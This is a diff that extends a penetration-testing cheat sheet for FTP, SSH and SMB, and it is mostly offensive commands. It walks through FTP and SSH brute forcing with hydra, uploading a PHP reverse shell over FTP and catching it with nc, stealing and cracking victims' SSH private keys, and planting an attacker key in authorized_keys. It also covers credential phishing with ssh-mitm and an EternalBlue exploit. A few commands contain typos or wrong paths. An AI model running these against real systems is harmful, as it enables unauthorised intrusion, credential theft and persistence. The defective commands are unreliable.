@@ -45,19 +45,183 @@ use auxiliary/scanner/ftp/titanftp_xcrc_traversal
 gobuster dir -u ftp://<IP> -w wordlist
 
 #Bruteforce
-hydra -t 1 -l {Username} -P {Big_Passwordlist} -vV {IP} ftp
-hydra -l ftp -P password.txt ftp://$ip 
-hydra -L username.txt -P password.txt ftp://$ip
+hydra -l username -P passwords.txt <target-ip> ftp
+hydra -L username.txt -p password <target-ip> ftp
+hydra -l username -P passwords.txt ftp://<target-ip>
+hydra -L usernames.txt -p password ftp://<target-ip>
+
+#Configuration
+cat /etc/vsftpd.conf
+cat /etc/vsftpd/vsftpd.conf
+
+#Reverse Shell
+wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php
+# Edit some variables in shell.php
+$ip = '<your-local-ip>';
+$port = 1234;
+#Upload
+ftp <target-ip>
+# Upload the payload you downloaded
+ftp> put shell.php
+# Get shell
+nc -lvnp 1234
+http://vulnerable.com/path/to/ftp/shell.php
 ```
 </details>
 
 <details markdown="1">
 <summary>SSH (22)</summary>
 
+### Basic commands
 ```bash
+sudo systemctl start ssh
+sudo systemctl stop ssh
+sudo systemctl restart ssh
+sudo systemctl status ssh
+ps -e | grep ssh
+#Config
+vim /etc/ssh/sshd_config
+#Chek for any Connection
+who | grep <username>
+#Kill Connections
+# -f: full process name to match
+sudo pkill -f pts/#
+# Authentication logs
+grep 'sshd' /var/log/auth.log
+```
+
+### Enumeration
+```bash
+nmap --script ssh-brute -p 22 <target-ip>
+nmap --script ssh-auth-methods --script-args="ssh.user=username" -p 22 <target-ip>
+nmap --script ssh-* -p 22 <target-ip>
+
+# User enumeration
+msfconsole
+msf> use auxiliary/scanner/ssh/ssh_enumusers
+
+# Banner and Audit
+nc <IP> 22
+ssh-audit <target-ip>
+```
+### Bruteforce
+```bash
+# -t: tasks
+hydra -l username -P passwords.txt <target-ip> ssh -t 4
+hydra -L usernames.txt -p password <target-ip> ssh -t 4
+
+# Specific ports
+hydra -l username -P passwords.txt -s 2222 <target-ip> ssh -t 4
+hydra -l username -P passwords.txt ssh://<target-ip>:2222 -t 4
+
 #Password spraying
 hydra -L usernames-list.txt -p Spring2025 ssh://10.1.1.10
 ```
+### Crack SSH Private Key
+```bash
+ssh2john private_key.txt > hash.txt
+# or
+python2 /usr/share/john/ssh2john.py private_key.txt > hash.txt
+
+# Crack the password of the private key
+john --wordlist=wordlist.txt hash.txt
+```
+### Connect
+```bash
+ssh username@<target-ip>
+ssh username@<target-ip> -p 22
+
+# Using private key
+ssh -i id_rsa username@<target-ip>
+
+# Without username
+ssh 10.0.0.1
+
+# Additional options
+# If we got the error message "no matching host key type found. Their offer: ssh-rsa..."
+ssh -o HostKeyAlgorithms=+ssh-rsa user@10.0.0.1
+# If we got error "no matching key exchange method found. Their offer: diffie-hellman-..."
+ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 user@10.0.0.1
+
+#Test connection
+ssh -T username@10.0.0.1
+ssh -T username@10.0.0.1 -vvv
+
+#Command execution
+ssh username@<target-ip> 'ls -l'
+
+#Windows AD
+ssh domain-name\\username@domain-controller
+
+#Via Private Key
+cat /home/<victim-user>/.ssh/id_rsa
+echo 'copied content of id_rsa' > private_key.txt
+chmod 600 private_key.txt
+ssh -i private_key.txt victim-user@<remote-ip>
+```
+
+### Transfer files
+```bash
+# Send a file
+scp ./example.txt user@<ip>:./example.txt\
+
+# Send a directory
+scp -r ./example user@<ip>:/home/<ip>/
+
+# Download a file
+scp user@<ip>:/home/<user>/path/to/file.txt .
+
+# Download a directory
+scp -r user@<ip>:/home/<user>/path/to/file.txt .
+```
+### Create SSH Keys
+```bash
+# Specify the output file
+ssh-keygen -f key
+
+# Specify Ed25519
+ssy-keygen -t ed25519
+
+#In target machine install ssh
+ssh-copy-id username@<target-ip>
+```
+
+### Generate SSH Keys and Set Up Public Key to Connect Remote Machine
+```bash
+#Check if authorized_keys Exists in Remote Machine
+ls /home/<remote-user>/.ssh/authorized_keys
+#If it exists, you may be able to connect SSH with your keys as victim user.
+
+#Generate SSH Keys in Local Machine
+ssh-keygen -f key
+
+#Copy the content of publick key
+cat ./key.pub
+#Then copy the content of public key you generated.
+
+#Add the Content of Publick Key to authorized_keys
+#In remote machine
+echo '<content of id_rsa.pub' >> /home/<victim-user>/.ssh/authorized_keys
+
+#Login with Private Key
+#In local machine, we have a SSH private key in local machine so we can login the target SSH server with it.
+# Change permission of the private key ('key', here)
+chmod 600 key
+# Login with it
+ssh victim@<target-ip> -i key
+```
+### Stealing Credentials via MiTM
+```bash
+# If not have the ssh-mitm, install first.
+pip3 install ssh-mitm --upgrade
+
+# --enable-trivial-auth: The "trivial authentication" phishing attack
+# --remote-host: Specify the target ip/domain
+# --listen-port: Specify the ip address to listen in local machine
+ssh-mitm server --enable-trivial-auth --remote-host example.com --listen-port 2222
+
+```
+
 </details>
 
 <details markdown="1">
@@ -307,6 +471,21 @@ put shell.aspx
 nc -lvnp 4444
 #Access the shared file
 https://example.com/path/to/smb/share/shell.aspx
+```
+
+### Eternal Blue (MS17-010)
+```bash
+#Metasploit
+use exploit/windows/smb/ms17_010_eternalblue
+set rhosts <target-ip>
+set lhost <local-ip>
+run
+# If you cannot get a shell with the default payloed (windows/x64/meterpreter/reverse_tcp), try to change the payload
+set payload payload/generic/shell_reverse_tcp
+
+#Automated tool (autoblue)
+git clone https://github.com/3ndG4me/AutoBlue-MS17-010
+python zzz_exploit.py -target-ip <target-ip> -port 445 'username:password@target'
 ```
 
 </details>
